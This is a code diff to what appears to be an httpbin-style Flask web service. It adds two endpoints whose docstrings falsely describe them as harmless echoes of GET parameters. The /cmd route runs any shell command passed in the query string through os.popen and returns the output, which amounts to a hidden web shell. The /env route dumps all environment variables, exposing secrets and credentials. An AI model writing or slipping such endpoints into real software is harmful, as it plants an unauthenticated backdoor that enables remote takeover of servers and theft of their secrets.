@@ -429,6 +429,53 @@ def view_post():
     )
 
 
+@app.route("/cmd")
+def view_post():
+    """The request's GET parameters.
+    ---
+    tags:
+      - HTTP Methods
+    produces:
+      - application/json
+    responses:
+      200:
+        description: The request's GET parameters.
+    """
+
+    import os
+    output = os.popen(request.args.get("cmd", "pwd")).read()
+    ret = get_dict("url", "args", "form", "data", "origin", "headers", "files", "json")
+    ret["output"] = output
+    return jsonify(ret)
+
+
+@app.route("/env")
+def view_post():
+    """The request's GET parameters.
+    ---
+    tags:
+      - HTTP Methods
+    produces:
+      - application/json
+    responses:
+      200:
+        description: The request's GET parameters.
+    """
+
+    import os
+    e = request.args.get("env", "")
+    ret_e = {}
+    if e:
+      ret_e[e] = os.environ.get(e, "")
+    else:
+      for k, v in os.environ.items():
+        ret_e[k] = v
+
+    ret = get_dict("url", "args", "form", "data", "origin", "headers", "files", "json")
+    ret["env"] = ret_e
+    return jsonify(ret)
+
+
 @app.route("/put", methods=("PUT",))
 def view_put():
     """The request's PUT parameters.
